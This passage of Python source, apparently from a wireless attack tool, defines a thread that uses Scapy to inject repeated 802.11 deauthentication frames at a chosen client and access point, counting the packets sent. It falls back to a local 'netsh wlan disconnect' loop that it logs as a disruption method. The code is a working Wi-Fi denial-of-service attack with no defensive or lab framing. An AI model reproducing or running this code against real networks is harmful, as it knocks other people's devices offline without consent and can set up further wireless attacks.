    def _deauth_thread(self, bssid, client, count):
        """Deauth thread - tries scapy first"""
        try:
            if SCAPY_AVAILABLE:
                self.output_queue.put(('log', "📡 Using Scapy for packet injection", 'info'))
                
                dot11 = Dot11(addr1=client, addr2=bssid, addr3=bssid)
                packet = RadioTap()/dot11/Dot11Deauth(reason=7)
                
                for i in range(count):
                    if self.stop_flag.is_set():
                        break
                    
                    try:
                        sendp(packet, verbose=False)
                        self.deauth_packets_sent += 1
                        self.output_queue.put(('deauth_counter', self.deauth_packets_sent))
                        
                        if i % 10 == 0:
                            self.output_queue.put(('log', f"📡 Sent {i} packets", 'info'))
                    except Exception as e:
                        self.output_queue.put(('log', f"⚠ Send error: {e}", 'warning'))
                        break
                    
                    time.sleep(0.1)
            else:
                # Alternative: use netsh to disrupt
                self.output_queue.put(('log', "⚠ Using alternative method", 'warning'))
                
                for i in range(min(count, 20)):
                    if self.stop_flag.is_set():
                        break
                    
                    subprocess.run("netsh wlan disconnect", shell=True, capture_output=True)
                    self.deauth_packets_sent += 1
                    self.output_queue.put(('deauth_counter', self.deauth_packets_sent))
                    time.sleep(0.5)
            
            self.output_queue.put(('log', f"✅ Deauth complete: {self.deauth_packets_sent} packets", 'success'))
            
        except Exception as e:
            self.output_queue.put(('log', f"❌ Deauth error: {e}", 'error'))
        finally:
            self.deauth_active = False
            self.output_queue.put(('deauth_done', None))
            
